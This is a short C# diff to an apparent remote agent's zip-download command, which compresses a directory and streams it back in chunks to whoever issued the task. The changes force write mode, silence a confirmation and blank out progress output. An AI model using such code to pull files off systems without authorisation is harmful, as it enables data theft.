@@ -63,6 +63,11 @@ namespace Agent
         {
             ZipDlArgs args = JsonSerializer.Deserialize<ZipDlArgs>(job.task.parameters);
 
+            if(!string.IsNullOrEmpty(args.destination))
+            {
+                args.write = true;
+            }
+
             var dirInfo = new DirectoryInfo(args.source);
 
             long directorySize = GetFolderSize(dirInfo);
@@ -83,12 +88,12 @@ namespace Agent
             if (args.write)
             {
                 ZipFile.CreateFromDirectory(args.source, args.destination, CompressionLevel.SmallestSize, false);
-                await messageManager.AddResponse(new TaskResponse()
-                {
-                    task_id = job.task.id,
-                    user_output = $"Zip written to {args.destination}.",
-                    completed = true
-                });
+                //await messageManager.AddResponse(new TaskResponse()
+                //{
+                //    task_id = job.task.id,
+                //    user_output = $"Zip written to {args.destination}.",
+                //    completed = true
+                //});
 
                 Stream fs = File.OpenRead(args.destination);
                 _streams.Add(job.task.id, fs);
@@ -124,12 +129,7 @@ namespace Agent
 
             await messageManager.AddResponse(new DownloadTaskResponse
             {
-                user_output = new DownloadJsonResponse()
-                {
-                    currentChunk = 0,
-                    totalChunks = job.total_chunks,
-                    file_id = string.Empty,
-                }.ToJson(),
+                user_output = string.Empty,
                 download = new DownloadTaskResponseData()
                 {
                     total_chunks = job.total_chunks,
@@ -176,12 +176,7 @@ namespace Agent
             DownloadTaskResponse dr = new DownloadTaskResponse()
             {
                 task_id = response.task_id,
-                user_output = new DownloadJsonResponse()
-                {
-                    currentChunk = downloadJob.chunk_num,
-                    totalChunks = downloadJob.total_chunks,
-                    file_id = downloadJob.file_id,
-                }.ToJson(),
+                user_output = String.Empty,
 
                 download = new DownloadTaskResponseData
                 {
